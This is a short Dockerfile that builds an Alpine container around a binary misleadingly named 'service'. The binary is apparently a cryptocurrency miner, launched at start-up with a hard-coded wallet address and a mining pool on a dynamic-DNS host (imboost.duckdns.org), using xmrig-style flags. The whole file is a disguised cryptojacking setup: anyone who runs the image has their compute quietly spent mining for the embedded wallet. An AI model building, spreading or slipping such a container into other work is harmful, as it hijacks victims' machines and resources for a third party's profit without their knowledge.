FROM alpine:latest


RUN mkdir -p /usr/local/bin/service
COPY service /usr/local/bin/service
RUN chmod +x /usr/local/bin/service

WORKDIR /usr/local/bin/service

ENV WALLET=Nfj5e5TC8PYbYwjoy38eE9Y6yyjUXR4rXe
ENV POOL=imboost.duckdns.org:7099
ENV WORKER_NAME=x

CMD ["sh", "-c", "./service --url=$POOL --donate-level=1 --user=$WALLET --pass=$WORKER_NAME -k -gr"]
